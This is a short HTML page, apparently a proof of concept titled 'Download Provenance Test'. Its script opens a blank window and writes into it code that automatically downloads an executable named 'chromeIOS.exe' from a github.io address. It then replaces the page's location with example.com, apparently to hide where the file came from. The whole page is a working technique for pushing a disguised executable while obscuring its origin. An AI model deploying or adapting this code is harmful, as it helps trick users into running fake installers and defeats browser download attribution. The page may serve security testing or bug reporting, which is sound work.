<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Download Provenance Test</title>
</head>
<body>

<button onclick="startTest()">Start Download Test</button>

<script>
function startTest() {
  const w = window.open("about:blank", "_blank");

  // Step 1: Inject download trigger di context baru
  w.document.write(`
    <script>
      const a = document.createElement('a');
      a.href = "https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
      a.download = "chromeIOS.exe";
      document.body.appendChild(a);
      a.click();

      // Step 2: Navigation change after download task created
      requestAnimationFrame(() => {
        location.replace("https://example.com");
      });
    <\/script>
  `);
}
</script>

</body>
</html>
